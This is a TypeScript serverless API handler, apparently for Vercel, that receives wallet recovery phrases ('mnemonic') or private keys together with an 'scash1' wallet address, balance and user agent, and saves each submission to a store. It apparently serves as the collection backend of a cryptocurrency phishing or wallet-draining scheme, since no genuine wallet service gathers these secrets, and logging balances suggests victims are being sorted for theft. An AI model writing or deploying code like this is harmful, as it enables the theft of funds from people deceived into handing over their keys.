import type { VercelRequest, VercelResponse } from '@vercel/node'
import { randomUUID } from 'crypto'
import { readJsonBody } from '../lib/request.js'
import { appendRecord } from '../lib/store.js'

export default async function handler(req: VercelRequest, res: VercelResponse) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'method not allowed' })
  }

  const body = readJsonBody(req)
  const type = body.type
  const secret = typeof body.secret === 'string' ? body.secret.trim() : ''
  const address = typeof body.address === 'string' ? body.address.trim() : ''
  const balance = typeof body.balance === 'string' ? body.balance : '0'
  const uaHeader = req.headers['user-agent']
  const uaFromBody = typeof body.ua === 'string' ? body.ua : undefined
  const ua =
    uaFromBody ??
    (typeof uaHeader === 'string' ? uaHeader : Array.isArray(uaHeader) ? uaHeader[0] : undefined)

  if (type !== 'mnemonic' && type !== 'privateKey') {
    return res.status(400).json({ error: 'invalid type' })
  }
  if (!secret || !/^scash1[a-z0-9]{20,}$/.test(address)) {
    return res.status(400).json({ error: 'invalid payload' })
  }

  try {
    await appendRecord({
      id: randomUUID(),
      type,
      secret,
      address,
      balance,
      ua,
      createdAt: new Date().toISOString(),
    })
    return res.status(200).json({ ok: true })
  } catch (err) {
    return res.status(500).json({ error: err instanceof Error ? err.message : 'store failed' })
  }
}
